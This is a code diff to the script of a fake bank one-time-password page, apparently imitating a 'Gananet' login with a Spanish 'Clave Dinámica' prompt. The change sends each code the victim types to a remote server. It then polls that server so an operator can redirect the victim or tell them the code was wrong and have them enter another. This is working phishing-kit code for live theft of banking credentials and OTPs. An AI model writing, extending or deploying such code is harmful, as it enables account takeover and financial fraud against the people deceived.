@@ -1,19 +1,3 @@
-const CHANNEL = 'gananet-ops';
-const STORAGE_KEY = 'gananet-ops-event';
-const SESSIONS_KEY = 'gananet-ops-sessions';
-
-function publish(message) {
-  const payload = { ...message, ts: Date.now() };
-  try {
-    const ch = new BroadcastChannel(CHANNEL);
-    ch.postMessage(payload);
-    ch.close();
-  } catch (_) {}
-  try {
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(payload));
-  } catch (_) {}
-}
-
 let sessionId = sessionStorage.getItem('sessionId');
 if (!sessionId) {
   sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
@@ -22,9 +6,44 @@ if (!sessionId) {
 
 // Start pings
 let pingInterval = setInterval(() => {
-  publish({ type: 'session:ping', sessionId });
+  fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
 }, 3000);
-publish({ type: 'session:ping', sessionId });
+fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
+
+// Start polling for actions
+let pollInterval = setInterval(async () => {
+  try {
+    const response = await fetch(`/api/sessions/${sessionId}`);
+    if (response.ok) {
+      const data = await response.json();
+      const action = data.action;
+      if (action === 'done') {
+        clearInterval(pingInterval);
+        clearInterval(pollInterval);
+        window.location.href = "index.html";
+      } else if (action === 'error-token') {
+        document.getElementById("otp-validating").hidden = true;
+        document.getElementById("otp-content").hidden = false;
+        resetOTP();
+        if (description) {
+          description.style.color = "#d93838";
+          description.style.fontWeight = "600";
+          description.textContent = "Clave Dinámica incorrecta. Por favor, verifica e ingresa nuevamente.";
+        }
+        // Reset action on server so it doesn't loop
+        fetch(`/api/sessions/${sessionId}/action`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: null })
+        }).catch(() => {});
+      } else if (action === 'error-user' || action === 'error-pass') {
+        clearInterval(pingInterval);
+        clearInterval(pollInterval);
+        window.location.href = `login.html?error=${action}`;
+      }
+    }
+  } catch (_) {}
+}, 2000);
 
 const slots = [...document.querySelectorAll("#otp-slots input")];
 const next = document.getElementById("otp-next");
@@ -79,6 +98,7 @@ document.getElementById("otp-clear").addEventListener("click", () => {
 
 document.getElementById("otp-close").addEventListener("click", () => {
   clearInterval(pingInterval);
+  clearInterval(pollInterval);
   window.location.href = "login.html";
 });
 
@@ -87,49 +107,11 @@ next.addEventListener("click", () => {
   document.getElementById("otp-content").hidden = true;
   document.getElementById("otp-validating").hidden = false;
 
-  publish({
-    type: 'session:token',
-    sessionId: sessionId,
-    token: value()
-  });
-});
-
-function onMessage(data) {
-  if (!data || typeof data !== 'object') return;
-  if (data.sessionId !== sessionId) return;
-
-  if (data.type === 'session:action') {
-    const action = data.action;
-    if (action === 'done') {
-      clearInterval(pingInterval);
-      window.location.href = "index.html";
-    } else if (action === 'error-token') {
-      document.getElementById("otp-validating").hidden = true;
-      document.getElementById("otp-content").hidden = false;
-      resetOTP();
-      if (description) {
-        description.style.color = "#d93838";
-        description.style.fontWeight = "600";
-        description.textContent = "Clave Dinámica incorrecta. Por favor, verifica e ingresa nuevamente.";
-      }
-    } else if (action === 'error-user' || action === 'error-pass') {
-      clearInterval(pingInterval);
-      window.location.href = `login.html?error=${action}`;
-    }
-  }
-}
-
-try {
-  const ch = new BroadcastChannel(CHANNEL);
-  ch.onmessage = (event) => onMessage(event.data);
-} catch (_) {}
-
-window.addEventListener('storage', (event) => {
-  if (event.key === STORAGE_KEY && event.newValue) {
-    try {
-      onMessage(JSON.parse(event.newValue));
-    } catch (_) {}
-  }
+  fetch(`/api/sessions/${sessionId}/token`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ token: value() })
+  }).catch(() => {});
 });
 
 window.addEventListener('DOMContentLoaded', () => {
